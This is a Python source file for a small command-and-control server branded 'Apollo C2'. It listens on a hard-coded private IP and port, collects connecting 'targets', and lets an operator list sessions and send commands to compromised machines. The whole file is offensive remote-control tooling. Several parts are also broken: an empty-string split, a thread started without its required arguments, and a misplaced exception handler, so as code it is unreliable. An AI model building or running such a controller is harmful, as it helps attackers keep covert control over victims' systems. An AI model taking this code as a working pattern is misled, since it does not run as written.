import socket
import sys
import threading

def banner():
    print('                       _ _          _____ ___   ')     
    print('     /\               | | |        / ____|__ \  ')      
    print('    /  \   _ __   ___ | | | ___   | |       ) | ')
    print('   / /\ \ |  _ \ / _ \| | |/ _ \  | |      / /  ')
    print('  / ____ \| |_) | (_) | | | (_) | | |____ / /_  ')
    print(' /_/    \_\ .__/ \___/|_|_|\___/   \_____|____| ')
    print('          | |                                   ')
    print('          |_|               By Luka Babetzki    ')             


def comm_in(targ_id):
    print('[+] Awaiting response...')
    response = targ_id.recv(1024).decode()
    return response

def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def target_comm(targ_id):
    while True:
        message = input('send message#>')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                targ_id.close()
                break
            print(response)

def listener_handler(host_ip, host_port, targets):
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def comm_handler(remote_target, remote_ip):
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            targets.append([remote_target, remote_ip[0]])
            print(
                f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            pass

if __name__ == '__main__':
    targets = []
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = '192.168.1.66'
        host_port = 2222
    except IndexError:
        print('\n[-] Command line arguement(s) missing. Please specify IP and Port.')
    except Exception as e:
        print(e)
    listener_handler(host_ip, host_port, targets)
    while True:
        try:
            command = input('Enter command#>')
            if command.split("")[0] == 'sessions':
                session_counter = 0
                if command.split("")[1] == '-l':
                    print('Session'+''*10+'Target')
                    for target in targets:
                        print(str(session_counter)+''*16+target[1])
                        session_counter +=1
                if command.split("")[1]=='-i':
                    num = int(command.split("")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print('\n[+] Keyboard interrupt issued. Exiting...')
            kill_flag = 1
            sock.close()
            break

